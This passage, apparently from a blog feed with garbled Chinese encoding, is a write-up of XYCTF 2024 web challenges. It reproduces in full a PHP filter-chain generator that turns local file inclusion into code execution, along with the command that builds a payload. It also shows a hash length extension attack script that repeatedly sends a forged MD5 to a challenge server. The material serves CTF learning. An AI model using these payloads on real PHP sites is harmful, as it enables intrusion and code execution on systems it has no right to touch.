class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜çš„trickåœ¨å¾ˆä¹…ä¹‹å‰å°±çœ‹è¿‡, åˆ©ç”¨å„ç§phpè¿‡æ»¤å™¨,æ— éœ€é›¶æ—¶æ–‡ä»¶åŒ…å«shell</p><p><a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p>è¿™é‡Œå°±æ¯”è¾ƒæŠ½è±¡, æ²¡æ‰¾åˆ°å¾ˆå¥½çš„è„šæœ¬, ä¸€å¼€å§‹æ€è·¯å°±æ˜¯å¤šå‡ æ¬¡base64è§£ç æ¥æŠŠXYCTFåé¢çš„ä¹±ç å¿½ç•¥, å¥ˆä½•ä¸€ç›´ä¸æˆåŠŸå°±æ”¾å¼ƒäº†</p><p>è´´ä¸€ä¸‹ä¸é”™çš„è„šæœ¬</p><p>php_filter_chain_generator.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># - Useful infos -</span></span><br><span class="line"><span class="comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span></span><br><span class="line"><span class="comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span></span><br><span class="line"><span class="comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No need to guess a valid filename anymore</span></span><br><span class="line">file_to_use = <span class="string">&quot;php://temp&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_filter_chain</span>(<span class="params">chain, debug_base64 = <span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    encoded_chain = chain</span><br><span class="line">    <span class="comment"># generate some garbage base64</span></span><br><span class="line">    filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">    filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">    <span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> encoded_chain[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug_base64:</span><br><span class="line">        <span class="comment"># don&#x27;t add the decode while debugging chains</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">    final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final_payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Parsing command line arguments</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;PHP filter chain generator.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&quot;--chain&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--rawbase64&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.chain <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        chain = args.chain.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        base64_value = base64.b64encode(chain).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        chain = generate_filter_chain(base64_value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="built_in">format</span>(args.chain, base64_value))</span><br><span class="line">        <span class="built_in">print</span>(chain)</span><br><span class="line">    <span class="keyword">if</span> args.rawbase64 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        rawbase64 = args.rawbase64.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">match</span>):</span><br><span class="line">            chain = generate_filter_chain(rawbase64, <span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(chain)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[-] Base64 string required.&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>æŠŠXYCTFå¤šbase64encodeå‡ æ¬¡,ç„¶åç”¨è„šæœ¬ç”Ÿæˆpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain Vm1wQ1lXTXhTa2RYYTFwWVZWRQ</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„payloadå¤šåŠ äº”ä¸ªbase64-decodeå³å¯</p><h2 id="ezLFI"><a href="#ezLFI" class="headerlink" title="ezLFI"></a>ezLFI</h2><p>è¿™é¢˜å¯ä»¥ç”¨php_filter_chainç›´æ¥è§£æ‰äº†, ä½†æ˜¯è€ƒç‚¹çœ‹èµ·æ¥åº”è¯¥æ˜¯nginx fast-cgiå“åº”è¿‡å¤§äº§ç”Ÿä¸´æ—¶æ–‡ä»¶çš„é‚£ä¸ªtrick</p><p><a href="https://tttang.com/archive/1384/#toc_0x02-includers-revenge-nginx-fastcgi-temp-lfi">https://tttang.com/archive/1384/#toc_0x02-includers-revenge-nginx-fastcgi-temp-lfi</a></p><p>åé¢è¡¥ä¸€ä¸‹å§</p><h2 id="give-me-flag-èµ›å"><a href="#give-me-flag-èµ›å" class="headerlink" title="give me flag(èµ›å)"></a>give me flag(èµ›å)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line">cc584e52a25c194614d8f8dff57c7f72</span><br></pre></td></tr></table></figure><p>ä¸€çœ¼å“ˆå¸Œæ‰©å±•æ”»å‡», hashpumpæ²¡äº†, è£…äº†hexpand,ä¸€ç›´æŠ¥æ®µé”™è¯¯â€¦.é‚æ”¾å¼ƒ</p><p>æ¨èå¦ä¸€ä¸ªé¡¹ç›®</p><p><a href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p><p>å¯ä»¥åœ¨ä¸‹é¢ä¸€ä¸ªè¿æ¥ç›´æ¥æŸ¥çœ‹å½“å‰unixæ—¶é—´æˆ³</p><p><a href="https://tool.chinaz.com/tools/unixtime.aspx">https://tool.chinaz.com/tools/unixtime.aspx</a></p><p>ç¨å¾®é¢„æµ‹ä¸€ä¸ªæå‰é‡:</p><p>1714286382</p><p>1714286700</p><p>æ‰©å±•md5</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428144622394.png" alt="image-20240428144622394"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:55475/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;?md5=e84fbfa78340af6d44eedfd75c59445d&amp;value=%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res=requests.get(url=url+payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;wait..&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;XYCTF&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428144636517.png" alt="image-20240428144636517"></p><h2 id="baby-unserialize-æœªè§£å‡º"><a href="#baby-unserialize-æœªè§£å‡º" class="headerlink" title="baby_unserialize(æœªè§£å‡º)"></a>baby_unserialize(æœªè§£å‡º)</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XYCTF-2024-Web&quot;&gt;&lt;a href=&quot;#XYCTF-2024-Web&quot; class=&quot;headerlink&quot; title=&quot;XYCTF 2024 Web&quot;&gt;&lt;/a&gt;XYCTF 2024 Web&lt;/h1&gt;&lt;h2 id=&quot;warm-up&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
    <category term="ssti" scheme="http://example.com/tags/ssti/"/>
    
    <category term="å‘½ä»¤æ³¨å…¥" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
    <category term="pharååºåˆ—åŒ–" scheme="http://example.com/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="LFI" scheme="http://example.com/tags/LFI/"/>
    
  </entry>
  
  <entry>
    <title>Java WebåŸºç¡€</title>
    <link href="http://example.com/2024/04/07/Java-Web%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/04/07/Java-Web%E5%9F%BA%E7%A1%80/</id>
    <published>2024-04-07T14:42:56.000Z</published>
    <updated>2024-04-29T15:56:37.716Z</updated>
    
